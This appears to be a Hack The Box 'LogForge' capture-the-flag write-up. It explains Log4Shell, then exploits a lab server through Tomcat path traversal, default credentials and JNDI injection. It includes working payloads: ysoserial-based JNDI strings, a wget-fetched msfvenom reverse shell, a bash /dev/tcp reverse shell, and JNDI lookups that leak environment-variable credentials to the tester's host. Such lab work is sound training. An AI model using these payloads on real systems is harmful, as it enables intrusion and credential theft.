
# 1. Lessons Learned

## 1.1 What is log4j2?
Apache **Log4j** is a [Java](https://en.wikipedia.org/wiki/Java_(software_platform) "Java (software platform)")-based [logging](https://en.wikipedia.org/wiki/Logging_(software) "Logging (software)") utility originally written by Ceki Gülcü. It is part of the [Apache Logging Services](https://en.wikipedia.org/w/index.php?title=Apache_Logging_Services&action=edit&redlink=1 "Apache Logging Services (page does not exist)"), a project of the [Apache Software Foundation](https://en.wikipedia.org/wiki/Apache_Software_Foundation "Apache Software Foundation"). Log4j is one of several [Java logging frameworks](https://en.wikipedia.org/wiki/Java_logging_framework "Java logging framework").

*https://en.wikipedia.org/wiki/Log4j

## 1.2 What is log4shell?
[Log4Shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), disclosed on December 10, 2021, is a remote code execution (RCE) vulnerability affecting Apache’s Log4j library, versions 2.0-beta9 to 2.14.1. The vulnerability exists in the action the Java Naming and Directory Interface (JNDI) takes to resolve variables. Affected versions of Log4j contain JNDI features—such as message lookup substitution—that do not protect against adversary-controlled Lightweight Directory Access Protocol (LDAP), Domain Name System (DNS), and other JNDI-related endpoints.
*https://www.cisa.gov/uscert/ncas/alerts/aa21-356a

According to the apache website, CVE-2021-44832 is fixed in Log4j 2.17.1 (Java 8), 2.12.4 (Java 7) and 2.3.2 (Java 6)
So let's download vulnerable code. 

## 1.3 So what is happening?
>...snip...
>the **JNDI** lookup paired with the **LDAP** protocol, will fetch a specified Java class from a remote source and deserialize it, executing some of the class’s code in the process.
...snip...

*https://jfrog.com/log4shell-0-day-vulnerability-all-you-need-to-know/

### 1.3.1 Typical format

`${jndi:ldap://somedomain.com}`
`${jndi:ldaps://somedomain.com}`
`${jndi:rmi://somedomain.com}`
`${jndi:dns://somedomain.com}` (Allows detecting vulnerable servers, does not lead to code execution.)

*https://jfrog.com/log4shell-0-day-vulnerability-all-you-need-to-know/

### 1.3.2 Caveat
log4j-api itself is not vulnerable. JNDIlookup functionality must be enabled. 


## 1.4 What is JNDI?
The Java Naming and Directory Interface™ (JNDI) is an application programming interface (API) that provides [naming](https://docs.oracle.com/javase/tutorial/jndi/overview/naming.html) and [directory](https://docs.oracle.com/javase/tutorial/jndi/overview/dir.html) functionality to applications written using the Java™ programming language. It is defined to be independent of any specific directory service implementation. Thus a variety of directories -new, emerging, and already deployed can be accessed in a common way.

## 1.5 JNDI Architecture?
JAVA Application||
JNDI API
Naming Manager  
JNDI SPI
|_LDAP_|_DNS_|_NIS_|_NDS_|_RMI_|_COBRA_|

**SPI - Service provider Interface - Specific to a service.  
**NIS - Network Information Service**
NIS is a distributed naming service. It is a mechanism for identifying and locating network objects and resources. It provides a uniform storage and retrieval method for network-wide information in a transport-protocol and media-independent fashion.
**NDS - Novell Directory servcie**
Novell Directory Services, also known as NDS, is a distributed network directory service for managing network resources such as users, servers, and peripherals that is loosely modeled after the [X.500 specification](https://networkencyclopedia.com/x-500/). Novell Directory Services (NDS) was originally called NetWare Directory Services.

*https://docs.oracle.com/javase/tutorial/jndi/overview/index.html*
*https://networkencyclopedia.com/novell-directory-services-nds/*
*https://docs.oracle.com/cd/E18752_01/html/816-4556/anis1-25461.html*



# 2. Test Summary

Port scan --> Web access via path traversal --> Log in with default credential --> log4shell vulnerability. 

## 2.1 Port Scanning
Port 21 and 8080 are filtered. 

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-17 14:29 EST
Nmap scan report for 10.10.11.138
Host is up (0.063s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp   open     http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ultimate Hacking Championship
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp filtered http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.75 seconds

```
## 2.2 Web 

Port 80: Basic webpage - Ultimate Hacking Championship
Could not go anywhere. 
http://10.10.11.138/lifetimescriptkiddie/ indicates page 404 and reveals the Server information. `Apache Tomcat/9.0.31`
Directly dive into tomcat vulnerability but turns out the website is not reacheable. 



Fuzzing time

```bash
┌──(kali㉿kali)-[~/HTB/logforge]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc=404 http://logforge.htb/FUZZ |tee wfuzz.80

┌──(kali㉿kali)-[~/HTB/logforge]
└─$ cat wfuzz.80    
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.138/FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000000003:   403        9 L      28 W       277 Ch      "admin"                                           
000000002:   302        0 L      0 W        0 Ch        "images"                                          
000000200:   403        9 L      28 W       277 Ch      "manager"                                         
000004227:   403        9 L      28 W       277 Ch      "server-status"                                   
000004255:   200        32 L     48 W       489 Ch      "http://10.10.11.138/"                            
000030014:   200        32 L     48 W       489 Ch      "http://10.10.11.138/"                            
000045543:   403        9 L      28 W       277 Ch      "host-manager"                                    
000059104:   200        32 L     48 W       489 Ch      "http://10.10.11.138/"                            

Total time: 0
Processed Requests: 62272
Filtered Requests: 62264
Requests/sec.: 0

                                                  
```
/admin, /manager, /server-status, /host-manager is there but was not reachable. The server must have some sort of ip block.. e.g. No external to internal application. 



### 2.2.2 Path Traversal

https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/

Tomcat will threat the sequence **/..;/** as **/../** and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.

Well stated in hacktricks as well. 
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat


10.10.11.138/scriptkiddie/..;/manager/
Then bypassed login pop up with tomcat:tomcat. 

The traffic from Burp Suite looks like this. 

```
POST /scriptkiddie/..;/manager/html/deploy HTTP/1.1
Host: 10.10.11.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://10.10.11.138
Authorization: Basic dG9tY2F0OnRvbWNhdA==
Connection: close
Referer: http://10.10.11.138/scriptkiddie/..;/manager/html/start?path=/
Cookie: JSESSIONID=60D2B41C4AE70B3321AB880F606F4DD6
Upgrade-Insecure-Requests: 1

deployPath=1&deployVersion=&deployConfig=&deployWar=
```




## 2.3 Tomcat. oh tomcat. 

Since the web indicates tomcat 9.0.31, as a good scriptkiddie, i searched for vulnerability
https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.31

According to the tomcat apache website, CVE-2020-9484 was fixed in 9.0.35. 
**Important: Remote Code Execution via session persistence** [CVE-2020-9484](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484)
So I tried this vulnerability from github. 

https://github.com/VICXOR/CVE-2020-9484
https://github.com/RepublicR0K/CVE-2020-9484


**But it did not work.**
Then tried the typical uploading .war file. Didn't work either. 

It turns out log4j2 can be used on Apache Tomcat server. So tomcat can be configured to use log4j2. 
```
...snip...
Apache Tomcat, for example, is completely different HTTP web server. It is written in Java and can pretty much be configured to use Log4J. I am not really sure if it is at all possible to log otherwise in Tomcat.
...snip...
```
https://serverfault.com/questions/1086113/does-apache-webserver-use-log4j-cve-2021-44228


### 2.3.1 log4shell verification
```
POST /scriptkiddie/..;/manager/html/deploy HTTP/1.1
Host: 10.10.11.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://10.10.11.138
Authorization: Basic dG9tY2F0OnRvbWNhdA==
Connection: close
Referer: http://10.10.11.138/scriptkiddie/..;/manager/html/start?path=/
Cookie: JSESSIONID=60D2B41C4AE70B3321AB880F606F4DD6
Upgrade-Insecure-Requests: 1

deployPath=`${jndi:ldap://10.10.16.9}`&deployVersion=&deployConfig=&deployWar=
```


The log4j2 vulnerability can be verified via two methods.
1. nc
2. tcpdump
```
┌──(kali㉿kali)-[~/HTB/logforge/log4j/apache-log4j-2.12.3-bin]
└─$ nc -nlvp 389
listening on [any] 389 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.138] 43854
0
 `
OR

┌──(kali㉿kali)-[~/HTB/logforge]
└─$ sudo tcpdump -i tun0 port 389   
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:47:05.201518 IP logforge.htb.43870 > 10.10.16.9.ldap: Flags [S], seq 4003916380, win 64240, options [mss 1335,sackOK,TS val 161860643 ecr 0,nop,wscale 7], length 0
19:47:05.201565 IP 10.10.16.9.ldap > logforge.htb.43870: Flags [R.], seq 0, ack 4003916381, win 0, length 0


```
What is happening here?

I am sending `${jndi:ldap://10.10.16.9}` to the vulnerable server. The server JNDI receives the request and respond with a LDAP request for resource. Since my station is not responding with LDAP understandable message, the server doesn't know what to do. There is no shell nor moving forward. 

So I need to configure my station with a LDAP server and a payload. 

https://blog.checkpoint.com/2021/12/14/a-deep-dive-into-a-real-life-log4j-exploitation/


### 2.3.2 log4shell exploit

Amazing work from Marcio Almedia can be found via twitter. 
https://twitter.com/marcioalm/status/1470361495405875200?s=20&t=_DXhwMgNCTu0ETznLoUZXw
https://github.com/pimps/JNDI-Exploit-Kit



Why CommonsCollections5?
```

┌──(kali㉿kali)-[~/HTB/logforge/JNDI-Exploit-Kit/target]
└─$ sudo java -jar /opt/ysoserial/ysoserial-master.jar CommonsCollection5 bash 'ping -c 3 10.10.16.9'> scriptkiddie.ser


──(kali㉿kali)-[~/HTB/logforge/JNDI-Exploit-Kit/target]
└─$ sudo java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -P scriptkiddie.ser -L 10.10.16.9:1389

```

It did NOT work! so did manual way with base64. 

I created payload using ysoserial-modified, but didn't work so had to do basic way. Basically, I used ─ ${jndi:ldap://127.0.0.1:1389/serial/CommonsCollections5/exec_unix/<base64command>}
```

┌──(kali㉿kali)-[~]                                                                                               [2/22]
└─$ echo "ping -c 3 10.10.16.9" |base64                      
cGluZyAtYyAzIDEwLjEwLjE2LjkK


─$ ${jndi:ldap://10.10.16.9:1389/serial/CommonsCollections5/exec_unix/bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE2LjkgOTAwMQo=}
*${jndi:ldap://10.10.16.9:1389/serial/CommonsCollections5/exec_unix/cGluZyAtYyAzIDEwLjEwLjE2LjkK}*

─$ sudo tcpdump -ni tun0 icmp 
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:00:13.183143 IP 10.10.11.138 > 10.10.16.9: ICMP echo request, id 1, seq 1, length 64
08:00:13.183177 IP 10.10.16.9 > 10.10.11.138: ICMP echo reply, id 1, seq 1, length 64
08:00:14.179494 IP 10.10.11.138 > 10.10.16.9: ICMP echo request, id 1, seq 2, length 64
08:00:14.179511 IP 10.10.16.9 > 10.10.11.138: ICMP echo reply, id 1, seq 2, length 64
08:00:15.180463 IP 10.10.11.138 > 10.10.16.9: ICMP echo request, id 1, seq 3, length 64
08:00:15.180484 IP 10.10.16.9 > 10.10.11.138: ICMP echo**** reply, id 1, seq 3, length 64


```


Using the website, https://www.base64encode.org/, generated base64 for following attempts. 

1. 

```
#Created a binary using msfvenom, upload, change to executable, then execute. --> Didn't work. 
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.9 LPORT=9001 -f elf >reverse.elf 

wget 10.10.16.9/reverse.elf -o /tmp/reverse.elf
chmod +x /tmp/reverse.elf
/tmp/reverse.elf

========================================================

#Created bash reverse shell file, upload the file, then execute. 

cat rev.sh
#!/bin/bash
#
bash -i >& /dev/tcp/10.10.16.9/9002 0>&1


wget 10.10.16.9/rev.sh -O /tmp/rev.sh
bash /tmp/rev.sh


#Actual payload sent via the website. 
${jndi:ldap://10.10.16.9:1389/serial/CommonsCollections5/exec_unix/YmFzaCAvdG1wL3Jldi5zaA==} 
${jndi:ldap://10.10.16.9:1389/serial/CommonsCollections5/exec_unix/YmFzaCAvdG1wL3JldjEuc2g=}

```



Decided to go with rlwrap. Then chaned to python3 with stty. 

```
┌──(kali㉿kali)-[~]
└─$ rlwrap -r  nc -nlvp 9002 
listening on [any] 9002 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.138] 39264
bash: cannot set terminal process group (802): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$ ls
ls
conf
lib
logs
policy
webapps
work
tomcat@LogForge:/var/lib/tomcat9$ whoami
whoami
tomcat
tomcat@LogForge:/var/lib/tomcat9$ 

```



```bash 

Shell: python3 -c "import pty; pty.spawn('/bin/bash')"
Ctrl+Z
Local:stty raw -echo; fg 
Shell:export TERM=xterm  

```


## 2.3.3 user.txt
```
tomcat@LogForge:/home/htb$ cat user.txt
cat user.txt
800591f7d810f5703b0e37a82751adaa
tomcat@LogForge:/home/htb$ pwd
pwd
/home/htb
tomcat@LogForge:/home/htb$ 

```


## 2.4 Easy path
Verified the network port. 
Initially 21 and 8080 were filtered. 
```
tomcat@LogForge:/home$ netstat -plant
netstat -plant
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        1      0 127.0.0.1:50966         127.0.0.1:8080          CLOSE_WAIT  -                   
tcp        0      0 127.0.0.1:57102         127.0.0.1:21            TIME_WAIT   -                   
tcp        0    140 10.10.11.138:39264      10.10.16.9:9002         ESTABLISHED 3072/bash           
tcp        1      0 127.0.0.1:50894         127.0.0.1:8080          CLOSE_WAIT  -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      802/java            
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:33386         127.0.0.1:34529         TIME_WAIT   -    
```


Logged in to ftp with wrong credential. 
It worked anyways. 
```
tomcat@LogForge:/tmp$ ftp 127.0.0.1
Connected to 127.0.0.1.
220 Welcome to the FTP-Server
Name (127.0.0.1:tomcat): tomcat
530 Not logged in
Login failed.
Remote system type is FTP.
ftp> ls
200 Command OK
125 Opening ASCII mode data connection for file list.
.profile
.ssh
snap
ftpServer-1.0-SNAPSHOT-all.jar
.bashrc
.selected_editor
run.sh
.lesshst
.bash_history
root.txt
.viminfo
.cache
226 Transfer complete.
ftp> get root.txt
local: root.txt remote: root.txt
200 Command OK
150 Opening ASCII mode data connection for requested file root.txt
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
33 bytes received in 0.00 secs (49.3515 kB/s)

40ac5bfc23f9adcfdfc89a7172aa5cb3

```


## 2.5 Not so easy path

Started the typical user/system/network enumeration. 
```


37  whoami                                                                                                           
   38  /etc/passwd                                                                                                      
   39  uname -a     
   40  sudo -l      
   41  ls -lisa /var/backup
   42  find / -perm /4000 -ls 2>/dev/null find / -perm /2000 -ls 2>/dev/null
   43  find / -perm /4000 -type f -exec 
   44  find / -perm /4000 -type f exec 
   45  find / -perm /4000 -type f -exec ls -ld
   46  find / -perm /4000 -type f -exec ls -ld{}           
   47  find / -perm /4000 -type f -exec ls -ld {}
   48  find / -perm -g=s -type f 2>/dev/null 
   49  history
   50  which su-
   51  uname -a     
   52  cat /etc/default
   53  cat /etc/hosts
   54  getcap -r / 2>/dev/null 
   55  echo $PATH   
   56  id     
   57  who            
   58  w
   59  who w
   60  pstree
   61  lsof
   62  ls -al /proc
   63  ps -elf
   64  man /ps
   65  man ps
   66  pstree 
   67  pstree -a
   68  systemctl status
   69  ifconfig -a
   70  ip route
   71  ip
   72  route
   73  netstat -plant
   74  ss arp -an
   75  ss arp-an
   76  ss
   77  arp -an
   78  route
   79  systemctl status
   80  ls
   81  cd /tmp
   82  ls
   83  cat root.txt 
   84  ls
   85  cd /
   86  ls
   87  nc 10.10.16.9 4444 < ftpServer-1.0-SNAPSHOT-all.jar 
   88  md5sum ftpServer-1.0-SNAPSHOT-all.jar 




```

process information
Under Cron, /root/ftp....jar is running. Downloaded the file via nc. The file was somewhat readable using vim. JD-GUI was used to look through the file. 

```
5 S root         978     770  0  80   0 -  1812 -      12:22 ?        00:00:00 /usr/sbin/CRON -f
4 S root         983     978  0  80   0 -   652 -      12:22 ?        00:00:00 /bin/sh -c /root/run.sh
0 S root         984     983  0  80   0 -  1412 -      12:22 ?        00:00:00 /bin/bash /root/run.sh
0 S root         985     984  0  80   0 - 894243 -     12:22 ?        00:00:08 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar


nc -lnvp 8001 > ftpServer.jar
nc 10.10.14.6 8001 < ftpServer-1.0-SNAPSHOT-all.jar

```

```
apt-get install jd-gui
```



Under main.java.com.ippsec.ftpserver->Worker.class
It seems like ftp_user name and ftp_password are stored in env variables. 


```
 
  private String validUser = System.getenv("ftp_user");  
    
  private String validPassword = System.getenv("ftp_password");


```

Username and password were verfied using wireshark and tcpdump. 

```

JNDI server --> 

${jndi:ldap://10.10.16.9:1389/${env:ftp_user}:${env:ftp_password}}


wireshark way


0....`........0....a.

......0Z...c8..ippsec:log4j_env_leakage

..

.............objectClass0...0...2.16.840.1.113730.3.4.20.. ...e...

.".....Unable to perform the search because an error occurred while attempting to parse base DN 'ippsec:log4j_env_leakage': The provided string could not be decoded as a DN because no equal sign was found after the RDN attribute 'ippsec:log4j_env_leakage'.0"...B...0...2.16.840.1.113730.3.4.2

OR

tcpdump way
sudo tcpdump -i tun0 -s 65535 -w output.pcap
ngrep -I output.pcap




```


# 3. Caveats
## 3.1 CommonCollections#?
https://thegreycorner.com/2016/05/01/commoncollections-deserialization.html
https://commons.apache.org/proper/commons-collections/
What is CommonsCollections :The [Java Collections Framework](http://docs.oracle.com/javase/tutorial/collections/) was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications.


### 3.1.1. Digging through tomcat. 
In order for me to generate commonscollections module in ysoserial, the vulnerable application has to use commons-collections. I verified that on tomcat. 
```
tomcat@LogForge:/usr/share/tomcat9$ grep -inr commons-collections
etc/catalina.properties:126:commons-collections*.jar,\

tomcat@LogForge:/usr/share/tomcat9$ cat ./etc/catalina.properties |grep commons-collections
commons-collections*.jar,\

```


Ippsec introduced the elegant way to verify java version. 
```
${jndi:ldap://ip:port/${sys:java.class.path}....${java:version}....${java:os}

```


Winthin the downloaded ftp..jar file, log4j is used but the commonscollections module was not. 
Meaning the ftp application is vulnerable to log4j, but we cannot create ysoserial payload using commonscollections. Need to find an alternative way. 
```
package main.java.com.ippsec.ftpServer;  
  
import java.io.BufferedInputStream;  
import java.io.BufferedOutputStream;  
import java.io.BufferedReader;  
import java.io.File;  
import java.io.FileInputStream;  
import java.io.FileOutputStream;  
import java.io.FileReader;  
import java.io.IOException;  
import java.io.InputStreamReader;  
import java.io.PrintWriter;  
import java.net.ServerSocket;  
import java.net.Socket;  
import org.apache.logging.log4j.LogManager;  
import org.apache.logging.log4j.Logger;


```


## 3.2 How to get env info?

https://bishopfox.com/blog/identify-and-exploit-log4shell
```
This turned out to be a valuable exploitation method all by itself too since the Message Lookup feature of Log4j supports nested strings and environment variable resolution. Meaning that you can make a payload string like this:

${jndi:ldap://${env:user}.12ab34cd.attacker.example.com:/bf}


The format that worked. 

${jndi:ldap://10.10.16.9:1389/${env:ftp_user}}

${jndi:ldap://10.10.16.9:1389/${env:ftp_user}:${env:ftp_password}}


${jndi:ldap://ip:port/${sys:java.class.path}....${java:version}....${java:os}

```



# 4. Resource



https://raxis.com/blog/log4j-exploit
https://github.com/kozmer/log4j-shell-poc
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
https://www.cybersecurity-help.cz/vdb/SB2020052124